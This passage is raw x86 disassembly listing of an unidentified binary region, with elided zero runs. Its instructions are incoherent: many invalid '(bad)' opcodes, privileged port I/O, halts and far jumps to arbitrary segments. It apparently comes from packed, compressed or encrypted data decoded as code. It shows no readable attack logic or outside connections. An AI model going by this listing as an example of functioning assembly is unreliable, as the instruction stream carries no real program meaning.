  417299:	add    DWORD PTR [ecx+0x58],edi
  41729c:	inc    edi
  41729d:	mov    ebx,0x4b8c56eb
  4172a2:	or     bh,BYTE PTR [edx-0x32]
  4172a5:	loopne 0x41727a
  4172a7:	push   eax
  4172a8:	leave  
  4172a9:	cwde   
  4172aa:	sub    ebp,DWORD PTR [ecx+0x36b84803]
  4172b0:	mov    edi,ds
  4172b2:	sub    eax,0xb678438c
  4172b7:	cmp    al,0x74
  4172b9:	lods   al,BYTE PTR ds:[esi]
  4172ba:	jmp    0x8681:0x56e2477f
  4172c1:	ja     0x417270
  4172c3:	add    DWORD PTR [esi+eax*1],ecx
  4172c6:	mov    ds:0x1afa8e57,eax
  4172cb:	outs   dx,DWORD PTR ds:[esi]
  4172cc:	mov    bl,0xd3
  4172ce:	stos   BYTE PTR es:[edi],al
  4172cf:	xchg   edx,eax
  4172d0:	cli    
  4172d1:	test   BYTE PTR [esi],ch
  4172d3:	js     0x417333
  4172d5:	push   ecx
  4172d6:	ss stos BYTE PTR es:[edi],al
  4172d8:	or     ch,BYTE PTR ds:0x1bf57ab
  4172de:	jmp    0x41726f
  4172e0:	and    al,0x1
  4172e2:	pop    ebx
  4172e3:	xor    al,BYTE PTR es:[edx]
  4172e6:	inc    eax
  4172e7:	jle    0x4172f2
  4172e9:	pushf  
  4172ea:	push   ss
  4172eb:	add    al,BYTE PTR [edx]
  4172ed:	pushf  
  4172ee:	fcom   DWORD PTR [ecx+eiz*8+0x69]
  4172f2:	es jmp 0x41732f
  4172f5:	and    DWORD PTR [ecx-0x7b2eb576],esp
  4172fb:	idiv   DWORD PTR [ebx]
  4172fd:	push   edx
  4172fe:	jnp    0x4172af
  417300:	fs and eax,0x5735947f
  417306:	jge    0x41729b
  417308:	xor    dl,bl
  41730a:	imul   BYTE PTR [eax+0x39b79fec]
  417310:	in     al,dx
  417311:	repnz cli 
  417313:	mov    eax,ds:0x9292028d
  417318:	pushf  
  417319:	iret   
  41731a:	pop    esp
  41731b:	jae    0x4172cb
  41731d:	sbb    al,0xf2
  41731f:	mov    BYTE PTR [ebx-0xf],bh
  417322:	lods   al,BYTE PTR ds:[esi]
  417323:	jmp    0x417326
  417325:	inc    ebx
  417326:	lea    ecx,[ebp+eiz*1-0xf305806]
  41732d:	aam    0x49
  41732f:	and    bl,BYTE PTR [ebp-0x5dd90c6c]
  417335:	test   DWORD PTR [bx+si+0x1cb9],0x6044664f
  41733e:	sbb    dl,dl
  417340:	sub    BYTE PTR [eax],al
	...
  4173b2:	add    BYTE PTR [eax],al
  4173b4:	repz inc ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x7a
  4173c1:	push   edx
  4173c2:	jo     0x4173bd
  4173c4:	jns    0x4173c3
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	cmc    
  4173c9:	add    BYTE PTR [eax],al
  4173cb:	add    ah,dh
  4173cd:	sub    edi,DWORD PTR [ebp+edi*4+0x6e3e1907]
  4173d4:	out    0x76,al
  4173d6:	inc    ebx
  4173d7:	xchg   BYTE PTR [ebp+0x6218ff8d],al
  4173dd:	jno    0x417454
  4173df:	(bad)  
  4173e0:	dec    BYTE PTR [ecx]
  4173e2:	sub    BYTE PTR [edx+0x4],dl
  4173e5:	inc    esi
  4173e6:	xor    eax,0x7358d8bc
  4173eb:	fnsave [ebx-0x7df94b36]
  4173f1:	in     al,0xa1
  4173f3:	fldcw  WORD PTR [edx-0x505bb5cf]
  4173f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173fa:	sub    ebp,DWORD PTR [eax+0x1e]
  4173fd:	sbb    cl,bl
  4173ff:	xor    al,0x37
  417401:	neg    DWORD PTR [edx-0x333a729e]
  417407:	int    0x54
  417409:	in     eax,0x79
  41740b:	sub    al,0x49
  41740d:	mov    dl,0x60
  41740f:	adc    cl,BYTE PTR [edx+0x9]
  417412:	not    al
  417414:	hlt    
  417415:	jmp    0x285f:0x1e4ada83
  41741c:	mov    edx,0x94b28c4b
  417421:	xor    eax,0x954f5783
  417426:	hlt    
  417427:	adc    eax,0xe132af5b
  41742c:	scas   eax,DWORD PTR es:[edi]
  41742d:	sub    eax,0xcf20671f
  417432:	xchg   esi,eax
  417433:	scas   eax,DWORD PTR es:[edi]
  417434:	mov    cl,BYTE PTR [eax+0x19]
  417437:	lods   eax,DWORD PTR fs:[esi]
  417439:	mov    BYTE PTR [esi],dh
  41743b:	mov    ds:0xe9b9e252,al
  417440:	push   ds
  417441:	jbe    0x41745d
  417443:	ins    DWORD PTR es:[edi],dx
  417444:	cmp    DWORD PTR [ebp+0xdfc98d2],0xfffffff4
  41744b:	xchg   edx,eax
  41744c:	shr    BYTE PTR [esi-0x5e],1
  41744f:	in     eax,dx
  417450:	inc    ecx
  417451:	icebp  
  417452:	repz sbb BYTE PTR [ebp-0x1d824b6a],al
  417459:	sbb    eax,0x21479971
  41745e:	std    
  41745f:	add    BYTE PTR [edi+0x1ad40231],dl
  417465:	bound  ebx,QWORD PTR [ebp+0x23b385dc]
  41746b:	mov    al,BYTE PTR [eax-0x7ac8224e]
  417471:	fcmovu st,st(1)
  417473:	jbe    0x417405
  417475:	inc    esp
  417477:	test   DWORD PTR [edx],0xc880aa43
  41747d:	call   0x2766:0x6639776f
  417484:	jnp    0x417407
  417486:	add    al,0x85
  417488:	and    dh,BYTE PTR [ebp+0x3ee14f91]
  41748e:	ret    
  41748f:	push   cs
  417490:	lods   eax,DWORD PTR es:[esi]
  417492:	fstp   QWORD PTR [esi]
  417494:	push   0x5fdac060
  417499:	icebp  
  41749a:	adc    eax,0x8fdfefc5
  41749f:	jno    0x4174d2
  4174a1:	call   0xeeee:0xa2e28f5b
  4174a8:	cmp    dl,bl
  4174aa:	sub    ch,bh
  4174ac:	pop    edx
  4174ae:	add    esi,edi
  4174b0:	imul   esp,DWORD PTR [esi],0xffffff90
  4174b3:	mov    edx,0xb77b80de
  4174b8:	aas    
  4174b9:	and    dh,ch
  4174bb:	shr    BYTE PTR [eax-0x218e7909],1
	...
  417531:	add    BYTE PTR [eax],al
  417533:	add    BYTE PTR ds:0xfff32bd8,ah
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0xcefa3b7a
  417542:	cdq    
  417543:	or     ebp,DWORD PTR [esi-0x2]
  417546:	add    BYTE PTR [eax],al
  417548:	cmc    
  417549:	add    BYTE PTR [eax],al
  41754b:	add    BYTE PTR [edi+0x2e],dh
  41754e:	sbb    DWORD PTR [eax],esp
  417550:	hlt    
  417551:	mov    ah,0x8a
  417553:	push   ebp
  417554:	cwde   
  417555:	xlat   BYTE PTR ds:[ebx]
  417556:	test   BYTE PTR [esi-0x67],bl
  417559:	fld    QWORD PTR [esi+0x1]
  41755c:	sti    
  41755d:	dec    ecx
  41755e:	das    
  41755f:	pop    esi
  417560:	xchg   edi,ecx
  417562:	xchg   esi,eax
  417563:	push   ecx
  417564:	pop    edi
  417565:	ficomp DWORD PTR [eax-0x55]
  417568:	shl    DWORD PTR [ecx],cl
  41756a:	mov    ecx,0xa7f83fa5
  41756f:	sbb    al,0xc8
  417571:	mov    dh,BYTE PTR [esp+edi*1]
  417574:	sbb    eax,0x9ac02a87
  417579:	test   al,ch
  41757b:	imul   eax
  41757d:	sub    DWORD PTR [ecx+0x22789603],eax
  417583:	mov    WORD PTR [esi+0x77],ds
  417586:	dec    ecx
  417587:	enter  0x491b,0xa0
  41758b:	leave  
  41758c:	xchg   BYTE PTR [ebx-0x12e53802],cl
  417592:	shr    ecx,1
  417594:	push   esp
  417595:	cmp    eax,DWORD PTR [ebx-0x12]
  417598:	sti    
  417599:	push   eax
  41759a:	icebp  
  41759b:	pop    ss
  41759c:	inc    esi
  41759d:	jl     0x417607
  41759f:	fsubr  st,st(3)
  4175a1:	mov    dl,0x62
  4175a3:	rcl    DWORD PTR [ebx+0x7b],cl
  4175a6:	js     0x41761a
  4175a8:	add    ebx,DWORD PTR ds:0xb44aca58
  4175ae:	xchg   ebx,eax
  4175af:	xchg   esi,eax
  4175b0:	leave  
  4175b1:	sti    
  4175b2:	jg     0x4175e0
  4175b4:	lods   eax,DWORD PTR ds:[esi]
  4175b5:	outs   dx,BYTE PTR ds:[esi]
  4175b6:	mov    ah,0xc5
  4175b8:	mov    eax,ds:0xc393e8ff
  4175bd:	(bad)  
  4175be:	rol    ebp,1
  4175c0:	repz mov eax,ds:0x5bb9051b
  4175c6:	stos   DWORD PTR es:[edi],eax
  4175c7:	pop    es
  4175c8:	(bad)  
  4175c9:	mov    ah,0x42
  4175cb:	stos   BYTE PTR es:[edi],al
  4175cc:	jge    0x417606
  4175ce:	adc    BYTE PTR [eax+ebp*8+0x9c45a10],ah
  4175d5:	lods   eax,DWORD PTR ds:[esi]
  4175d6:	push   ds
  4175d7:	ret    
  4175d8:	fnstsw ax
  4175da:	fwait
  4175db:	push   ebp
  4175dc:	inc    esp
  4175dd:	ins    DWORD PTR es:[edi],dx
  4175de:	pop    ecx
  4175df:	pop    esp
  4175e0:	jae    0x4175b7
  4175e2:	xor    al,0x4e
  4175e4:	pop    esp
  4175e5:	mov    cl,0x75
  4175e7:	in     al,0x24
  4175e9:	hlt    
  4175ea:	(bad)  
  4175eb:	adc    ebp,DWORD PTR [ecx-0x74011ffc]
  4175f1:	pop    esp
  4175f2:	sub    al,dl
  4175f4:	mov    ch,0xf4
  4175f6:	inc    esp
  4175f7:	mov    ebp,gs
  4175f9:	imul   esp,DWORD PTR [esi-0x52019150],0x29b751b9
  417603:	mov    ebp,0x1a8b717e
  417608:	mov    ecx,0xfcf9c821
  41760d:	push   eax
  41760e:	or     al,0xa
  417610:	sti    
  417611:	fild   WORD PTR [edi]
  417613:	dec    ecx
  417614:	and    ecx,ebx
  417616:	in     eax,dx
  417617:	push   eax
  417618:	outs   dx,DWORD PTR ds:[esi]
  41761a:	jmp    0xbc73c609
  41761f:	inc    ebx
  417620:	sbb    eax,0x17d42e07
  417625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417626:	and    eax,0x7f3deb61
  41762b:	cld    
  41762c:	and    DWORD PTR [ecx-0x43],esi
  41762f:	add    bh,ah
  417631:	pop    edi
  417632:	in     eax,0x1e
  417634:	jmp    0x24669614
  417639:	jmp    0x512f:0x37e05335
  417640:	push   0x0
	...
  4176b2:	add    BYTE PTR [eax],al
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	call   0xff:0x637c8d89
  4176c7:	add    ch,dh
  4176c9:	add    BYTE PTR [eax],al
  4176cb:	add    BYTE PTR [ebp-0x66],ah
  4176ce:	mov    ebx,0x15ba30c1
  4176d3:	ins    DWORD PTR es:[edi],dx
  4176d4:	stc    
  4176d5:	xor    ecx,DWORD PTR [edi]
  4176d7:	and    ebp,ecx
  4176d9:	push   eax
  4176da:	push   es
  4176db:	out    0x2f,eax
  4176dd:	fcmove st,st(7)
  4176df:	imul   esi,DWORD PTR [ebx],0xb94a2607
  4176e5:	xchg   edi,eax
  4176e6:	xor    al,0xb4
  4176e8:	stos   DWORD PTR es:[edi],eax
  4176e9:	das    
  4176ea:	mov    ebp,0x87469a0e
  4176ef:	aaa    
  4176f0:	sti    
  4176f1:	mov    esi,0xfc33b9f5
  4176f6:	test   DWORD PTR [ebp+esi*4-0x10],0xe6a61ee1
  4176fe:	pop    ebp
  4176ff:	sub    al,0x9f
  417701:	(bad)  
  417702:	nop
  417703:	das    
  417704:	push   ds
  417705:	fdiv   st(2),st
  417707:	adc    ecx,ebx
  417709:	inc    esi
  41770a:	lock pop ebx
  41770c:	pop    ax
  41770e:	es enter 0xfc47,0x9a
  417713:	int3   
  417714:	cmp    ebp,DWORD PTR [eax+0x50]
  417717:	or     DWORD PTR [esp+esi*4],esp
  41771a:	add    BYTE PTR [edx+0x6d85f5fe],ch
  417720:	add    edi,DWORD PTR [esi]
  417722:	adc    BYTE PTR [esi],cl
  417724:	or     eax,0xe5570da5
  417729:	shl    DWORD PTR [ebp-0xd5a6316],0xb5
  417730:	adc    eax,0xcafe6041
  417735:	std    
  417736:	aas    
  417737:	enter  0xbf0d,0xb2
  41773b:	and    al,ch
  41773d:	rcl    dl,0xc5
  417740:	mov    es,WORD PTR [edx+0x26d729d5]
  417746:	outs   dx,DWORD PTR ds:[esi]
  417747:	jo     0x417710
  417749:	inc    edi
  41774a:	(bad)  
  41774b:	lds    edx,FWORD PTR [eax-0x19]
  41774e:	shr    DWORD PTR ds:0x4b2c86fd,1
  417754:	or     eax,DWORD PTR [ebx+edi*2]
  417757:	pop    esp
  417758:	dec    ebp
  417759:	inc    ecx
  41775a:	push   ebp
  41775b:	or     dh,0xfc
  41775e:	orps   xmm5,XMMWORD PTR [edx+0x2a]
  417762:	cmp    eax,edx
  417764:	out    dx,al
  417765:	call   0xe1648dca
  41776a:	out    0x9c,eax
  41776c:	and    BYTE PTR [esi-0xa],0xba
  417770:	stc    
  417771:	imul   esp,DWORD PTR [esi],0xd623414d
  417777:	pop    esp
  417778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417779:	mov    eax,0x8505e524
  41777e:	addr16 aam 0xd6
  417781:	sub    BYTE PTR ds:0xe0a52840,dh
  417787:	pop    ebp
  417788:	fcom   DWORD PTR [eax]
  41778a:	aaa    
  41778b:	daa    
  41778c:	call   0x20cbafa3
  417791:	ja     0x417798
  417793:	in     al,0x3b
  417795:	jp     0x417723
  417797:	out    dx,eax
  417798:	xor    eax,0x7ae97781
  41779d:	adc    al,0x40
  41779f:	adc    BYTE PTR [esi],0x47
  4177a2:	aam    0x3d
  4177a4:	fiadd  WORD PTR [edx]
  4177a6:	xchg   ebp,eax
  4177a7:	sub    ch,BYTE PTR [edx-0x60f9c0c4]
  4177ad:	jbe    0x41777a
  4177af:	cmp    al,0x37
  4177b1:	push   ds
  4177b2:	mov    dh,0x41
  4177b4:	mov    esp,0x542a5e54
  4177b9:	in     al,dx
  4177ba:	cld    
  4177bb:	push   es
  4177bc:	and    DWORD PTR [ebx],0x1a
  4177bf:	retf   0xab
	...
  417832:	add    BYTE PTR [eax],al
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x767d6e99
  417841:	dec    esp
  417842:	push   esp
  417843:	ret    0x58
  417846:	add    DWORD PTR [eax],eax
  417848:	cmc    
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [edi+ebp*4+0x6c],dh
  41784f:	fdivrp st(2),st
  417851:	xor    ebp,eax
  417853:	mov    edi,0xc4b61ea3
  417858:	xor    al,0x13
  41785a:	mov    edx,0x68571eed
  41785f:	bound  edi,QWORD PTR [ebx+0x6d]
  417862:	cmp    ebx,esp
  417864:	jp     0x417859
  417866:	push   ds
  417867:	mov    ds:0xf293f6dc,eax
  41786c:	cmp    al,0x75
  41786e:	lods   eax,DWORD PTR ds:[esi]
  41786f:	and    eax,0x3b1f7193
  417874:	clc    
  417875:	add    ebx,esp
  417877:	loope  0x4178b4
  417879:	std    
  41787a:	jecxz  0x41782d
  41787c:	leave  
  41787d:	nop
  41787e:	repz rol BYTE PTR [edi],cl
  417881:	inc    ecx
  417882:	fdiv   DWORD PTR [edi-0x50]
  417885:	mov    eax,0x6f04fe8e
  41788a:	fld    TBYTE PTR [ebx]
  41788c:	mov    ebx,0x36f45348
  417891:	xchg   ebx,eax
  417892:	cmp    al,0x4f
  417895:	jecxz  0x4178ea
  417897:	or     eax,0xaf62096
  41789c:	mov    cl,0x57
  41789e:	cdq    
  41789f:	pop    edx
  4178a0:	xor    DWORD PTR [ecx+0x7d9cf6c3],ebx
  4178a6:	fstp   st(7)
  4178a8:	push   ss
  4178a9:	adc    DWORD PTR ds:0x4ede246c,edx
  4178af:	adc    BYTE PTR ss:[esi-0x63c6388e],bh
  4178b6:	ret    0xf6f5
  4178b9:	cmp    eax,0xf0ca6215
  4178be:	popa   
  4178bf:	mov    ah,0x45
  4178c1:	cmp    edx,edx
  4178c3:	ins    BYTE PTR es:[edi],dx
  4178c4:	in     al,0xb1
  4178c6:	sub    BYTE PTR [ebp-0x28],bh
  4178c9:	ins    BYTE PTR es:[di],dx
  4178cb:	adc    al,BYTE PTR ds:0xdfd2ada1
  4178d1:	or     DWORD PTR [eax+0x4e],esp
  4178d4:	xchg   edx,eax
  4178d5:	mov    eax,ds:0x5b0e6806
  4178da:	pusha  
  4178db:	inc    ebx
  4178dc:	push   ebx
  4178dd:	fs sahf 
  4178df:	in     al,dx
  4178e0:	pop    edi
  4178e1:	sar    DWORD PTR [esi-0x3ed1fa62],cl
  4178e7:	jne    0x417965
  4178e9:	pop    esi
  4178ea:	inc    esi
  4178eb:	ds cld 
  4178ed:	mov    ebp,0x260a24a7
  4178f2:	aad    0x7d
  4178f4:	fxam   
  4178f6:	clc    
  4178f7:	adc    eax,0x4a8af3b1
  4178fc:	hlt    
  4178fd:	fldenv [esi]
  4178ff:	icebp  
  417900:	sti    
  417901:	fidivr DWORD PTR [edx+0x4a]
  417904:	fstp   TBYTE PTR [ebx+0x5e372972]
  41790a:	mov    cl,0x60
  41790c:	push   ds
  41790d:	ins    BYTE PTR es:[edi],dx
  41790e:	(bad)  
  41790f:	push   ss
  417910:	and    al,0x0
  417912:	and    bl,BYTE PTR [edx-0x7f]
  417915:	mov    al,0x7a
  417917:	mov    eax,0xc31c366b
  41791c:	loop   0x41790c
  41791e:	aad    0x93
  417920:	push   es
  417921:	or     ch,BYTE PTR [edi]
  417923:	cs mov ah,0x5f
  417926:	ror    eax,0x99
  417929:	bound  ebp,QWORD PTR [ebx]
  41792b:	inc    edx
  41792c:	sbb    DWORD PTR [eax],edi
  41792e:	mov    ebx,0xdb90a052
  417933:	loope  0x417951
  417935:	add    al,BYTE PTR [edx+0x3e7b662d]
  41793b:	retf   
  41793c:	push   ss
  41793d:	nop
  41793e:	das    
  41793f:	xchg   edx,eax
  417940:	stc    
	...
  4179b1:	add    BYTE PTR [eax],al
  4179b3:	add    bl,cl
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi+0x75a6c980]
  4179c2:	in     eax,0xea
  4179c4:	dec    ebp
  4179c5:	add    DWORD PTR [ecx],eax
  4179c7:	add    ch,dh
  4179c9:	add    BYTE PTR [eax],al
  4179cb:	add    BYTE PTR [ebx],ch
  4179cd:	int3   
  4179ce:	pop    es
  4179cf:	push   ebp
  4179d0:	dec    ebp
  4179d1:	adc    dh,BYTE PTR [esi+0x16]
  4179d4:	push   ax
  4179d6:	dec    edi
  4179d7:	bound  ebp,QWORD PTR [eax+0x159e7c07]
  4179dd:	add    ecx,DWORD PTR [esi-0x41908293]
  4179e3:	xor    edi,ecx
  4179e5:	xchg   ecx,eax
  4179e6:	sahf   
  4179e7:	or     al,bl
  4179e9:	adc    ebp,DWORD PTR [edx]
  4179eb:	xor    DWORD PTR [esi+0x29bac3ac],0x3643bf77
  4179f5:	mov    al,0x3a
  4179f7:	(bad)  
  4179f8:	stc    
  4179f9:	cld    
  4179fa:	test   cl,ah
  4179fc:	and    eax,0xec34fa27
  417a01:	inc    ecx
  417a02:	and    ah,bh
  417a04:	ins    BYTE PTR es:[edi],dx
  417a05:	pop    esp
  417a06:	xor    cl,BYTE PTR [ebx+0x48]
  417a09:	add    BYTE PTR [ecx-0x4a98c08f],ah
  417a0f:	mov    ebx,0xd48e845
  417a14:	call   0x9b5dc072
  417a19:	adc    DWORD PTR [esi+eax*2],eax
  417a1c:	sub    cl,BYTE PTR [ebx+0x4c]
  417a1f:	(bad)  
  417a20:	dec    eax
  417a21:	stos   BYTE PTR es:[edi],al
  417a22:	scas   eax,DWORD PTR es:[edi]
  417a23:	jne    0x4179b0
  417a25:	pop    ebp
  417a26:	fincstp 
  417a28:	adc    edi,DWORD PTR [esi-0x56ce30e0]
  417a2e:	stc    
  417a2f:	in     al,0x3a
  417a31:	and    ebp,ebx
  417a33:	minps  xmm0,XMMWORD PTR [ecx+0xc]
  417a37:	test   eax,0x430a625
  417a3c:	inc    edx
  417a3d:	mov    ds:0x7cb61adf,eax
  417a42:	cmp    al,bl
  417a44:	mov    esp,0x1772925e
  417a49:	adc    eax,0x97ab480e
  417a4e:	clc    
  417a4f:	adc    al,0xf7
  417a51:	stc    
  417a52:	mov    ebx,0xcb15f63d
  417a57:	xor    BYTE PTR [ecx],ah
  417a59:	add    BYTE PTR [esi+0x59],ah
  417a5c:	ror    ecx,1
  417a5e:	push   esi
  417a5f:	and    al,0x71
  417a61:	cmc    
  417a62:	test   al,0x40
  417a64:	outs   dx,BYTE PTR ds:[esi]
  417a65:	gs push ebp
  417a67:	mov    ss,WORD PTR [eax-0x22fb422]
  417a6d:	stc    
  417a6e:	sub    esp,DWORD PTR [ecx-0x1d21c70b]
  417a74:	fs pop ds
  417a76:	popa   
  417a77:	icebp  
  417a78:	out    dx,al
  417a79:	xchg   ecx,eax
  417a7a:	mov    ecx,0xab74c5b6
  417a7f:	add    eax,0xe7f7bd0e
  417a84:	push   es
  417a85:	aas    
  417a86:	add    cl,BYTE PTR [edx-0x52]
  417a89:	mov    bh,0x4f
  417a8b:	xrelease xchg BYTE PTR [edx-0x60],ch
  417a8f:	enter  0x7d46,0xac
  417a93:	mov    ds:0x1adbb877,al
  417a98:	add    bl,ah
  417a9a:	push   ebp
  417a9b:	jl     0x417adc
  417a9d:	jl     0x417b1e
  417a9f:	jmp    0x417a46
  417aa1:	cmp    edi,DWORD PTR [ecx-0x1e8fff6f]
  417aa7:	push   gs
  417aa9:	mov    esp,0x24d12cdb
  417aae:	or     ecx,edx
  417ab0:	pop    eax
  417ab1:	push   esp
  417ab2:	ins    DWORD PTR es:[edi],dx
  417ab3:	mov    ecx,0xb68e1e70
  417ab8:	fwait
  417ab9:	leave  
  417aba:	daa    
  417abb:	dec    esi
  417abc:	mov    esp,0x204c12ca
	...
  417b31:	add    BYTE PTR [eax],al
  417b33:	add    bl,ah
  417b35:	gs push cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0xf8fef5f7
  417b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b42:	xchg   edi,eax
  417b43:	das    
  417b44:	inc    edx
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    ch,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    BYTE PTR [edx-0x69],cl
  417b4e:	sub    eax,0xd7ca1e0e
  417b53:	dec    eax
  417b54:	xor    BYTE PTR [ecx+eiz*4],dh
  417b57:	and    BYTE PTR [edi],bl
  417b59:	mov    DWORD PTR [edx-0x1e4fe4fa],ebx
  417b5f:	ins    DWORD PTR es:[edi],dx
  417b60:	adc    cl,BYTE PTR [ecx+0x21]
  417b63:	pop    ds
  417b64:	aad    0x9e
  417b66:	cli    
  417b67:	repnz lods al,BYTE PTR ds:[esi]
  417b69:	jns    0x417b2d
  417b6b:	cli    
  417b6c:	daa    
  417b6d:	adc    dl,BYTE PTR [eax]
  417b6f:	stos   BYTE PTR es:[edi],al
  417b70:	mov    bh,0x8d
  417b72:	xor    ecx,DWORD PTR [ecx-0x51]
  417b75:	or     eax,0xafdc0c22
  417b7a:	mov    ecx,0x3870d012
  417b7f:	test   al,0x1c
  417b81:	inc    ecx
  417b82:	add    eax,esi
  417b84:	sub    eax,0xd7769131
  417b89:	jb     0x417b3b
  417b8b:	jne    0x417b49
  417b8d:	push   ecx
  417b8e:	pop    esi
  417b8f:	fs loop 0x417ba0
  417b92:	dec    ebp
  417b93:	mov    bl,0x86
  417b95:	xchg   BYTE PTR [edx-0x526adcee],al
  417b9b:	and    BYTE PTR [edx+0x2b],bh
  417b9e:	jmp    0xc13c9e1b
  417ba3:	inc    esp
  417ba4:	sahf   
  417ba5:	sahf   
  417ba6:	and    al,0xa6
  417ba8:	sti    
  417ba9:	repnz sbb bl,dh
  417bac:	push   ecx
  417bad:	fs and al,0x4a
  417bb0:	adc    cl,dh
  417bb2:	pusha  
  417bb3:	(bad)  
  417bb4:	imul   esi,DWORD PTR [eax+0x55],0xfffffff1
  417bb8:	mov    DWORD PTR [ecx],edx
  417bba:	cmp    al,BYTE PTR [edx+0x46382246]
  417bc0:	fnstenv [edi+ecx*4-0x72ea19a7]
  417bc7:	jp     0x417c03
  417bc9:	mov    ebx,0x700a2e44
  417bce:	lahf   
  417bcf:	and    BYTE PTR [ecx+0x54],0xf2
  417bd3:	ins    BYTE PTR es:[edi],dx
  417bd4:	xchg   edx,eax
  417bd5:	rcr    BYTE PTR [eax],1
  417bd7:	mov    ebx,0x4f0c6761
  417bdc:	pop    edx
  417bdd:	shl    BYTE PTR [edx+0x78],0xfa
  417be1:	jns    0x417c2e
  417be3:	cs sahf 
  417be5:	mov    dl,0x75
  417be7:	or     BYTE PTR [esi+0x42],al
  417bea:	cmc    
  417beb:	aad    0xe7
  417bed:	jg     0x417c62
  417bef:	cs pop es
  417bf1:	inc    edi
  417bf2:	repz inc edx
  417bf4:	test   DWORD PTR [ebx+0x56],ebp
  417bf7:	add    edi,edi
  417bf9:	fstp   QWORD PTR [esi-0x492cb507]
  417bff:	cmp    bl,al
  417c01:	ins    DWORD PTR es:[edi],dx
  417c02:	mov    bh,0x1d
  417c04:	jb     0x417b8a
  417c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c07:	call   0x808f:0x4879b202
  417c0e:	xchg   DWORD PTR [ebp-0x2c],edx
  417c11:	fild   QWORD PTR [ebx+0x48]
  417c14:	scas   al,BYTE PTR es:[edi]
  417c15:	jg     0x417baf
  417c17:	mov    cl,0x73
  417c19:	dec    edx
  417c1a:	and    al,0x49
  417c1c:	sub    al,0x12
  417c1e:	int    0xbe
  417c20:	in     eax,0xb2
  417c22:	xchg   ecx,eax
  417c23:	dec    ebx
  417c24:	test   dh,cl
  417c26:	add    ch,BYTE PTR [edi]
  417c28:	push   ebx
  417c29:	pop    esi
  417c2a:	xchg   ebx,eax
  417c2b:	out    0x72,al
  417c2d:	aas    
  417c2e:	hlt    
  417c2f:	inc    esi
  417c30:	sub    eax,0x8c43fcb
  417c35:	cli    
  417c36:	pop    edx
  417c37:	add    ch,BYTE PTR [esi+0x6e]
  417c3a:	jbe    0x417bc7
  417c3c:	pop    ebp
  417c3d:	pop    es
  417c3e:	ds and al,0x63
	...
  417cb1:	add    BYTE PTR [eax],al
  417cb3:	add    BYTE PTR [ecx],ah
  417cb5:	xchg   ebx,eax
  417cb6:	mov    DWORD PTR [edi-0x60d84045],ebp
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [edi+0x7e],edx
  417cc2:	arpl   WORD PTR ds:0x10337,bx
  417cc8:	cmc    
  417cc9:	add    BYTE PTR [eax],al
  417ccb:	add    BYTE PTR [ebp-0x556ad454],cl
  417cd1:	inc    edx
  417cd2:	mov    ss,WORD PTR [ebx+0x8345788]
  417cd8:	ins    BYTE PTR es:[edi],dx
  417cd9:	or     eax,0x5cadf8d9
  417cde:	jmp    0x417c81
  417ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ce1:	rol    DWORD PTR [edx-0x32],0x80
  417ce5:	iret   
  417ce6:	dec    edi
  417ce7:	outs   dx,DWORD PTR ds:[esi]
  417ce8:	bound  ecx,QWORD PTR [edx-0x32a9ed77]
  417cee:	rol    BYTE PTR [edx-0x2b2e438f],1
  417cf4:	xlat   BYTE PTR ds:[ebx]
  417cf5:	dec    ebx
  417cf6:	bound  edi,QWORD PTR [ebx-0x53]
  417cf9:	bswap  ebx
  417cfb:	xchg   ebx,eax
  417cfc:	push   ds
  417cfd:	in     eax,0x4f
  417cff:	push   ss
  417d00:	pop    ebp
  417d01:	cs push esi
  417d03:	push   edi
  417d04:	dec    edi
  417d05:	cwde   
  417d06:	push   eax
  417d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d08:	jns    0x417d2e
  417d0a:	fsubr  DWORD PTR [esi-0x1d23272d]
  417d10:	push   ebx
  417d11:	dec    bx
  417d13:	push   cs
  417d14:	aam    0x40
  417d16:	push   edi
  417d17:	dec    ebp
  417d18:	push   cs
  417d19:	ficom  DWORD PTR [esi+0x3d]
  417d1c:	out    dx,eax
  417d1d:	adc    eax,0x496f90d5
  417d22:	xchg   ebx,eax
  417d23:	loope  0x417d96
  417d25:	pop    edi
  417d26:	rcl    BYTE PTR [ebp-0x30],cl
  417d29:	jle    0x417cee
  417d2b:	rcr    DWORD PTR [edx],0xe0
  417d2e:	xchg   esi,eax
  417d2f:	popf   
  417d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d31:	push   esp
  417d32:	xchg   edi,eax
  417d33:	jmp    0xf453eb8a
  417d38:	call   0xcdb5db01
  417d3d:	jl     0x417d1c
  417d3f:	cwde   
  417d40:	hlt    
  417d41:	mov    al,ds:0xd0ebe49f
  417d46:	loopne 0x417cdf
  417d48:	dec    ecx
  417d49:	mov    dh,dl
  417d4b:	pop    esp
  417d4c:	inc    edi
  417d4d:	fistp  QWORD PTR [ebx]
  417d4f:	push   es
  417d50:	out    0x5a,al
  417d52:	xchg   edi,eax
  417d53:	pop    ecx
  417d54:	cmp    BYTE PTR [ecx+0x4f],bh
  417d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d58:	cmp    edx,ebx
  417d5a:	loope  0x417d94
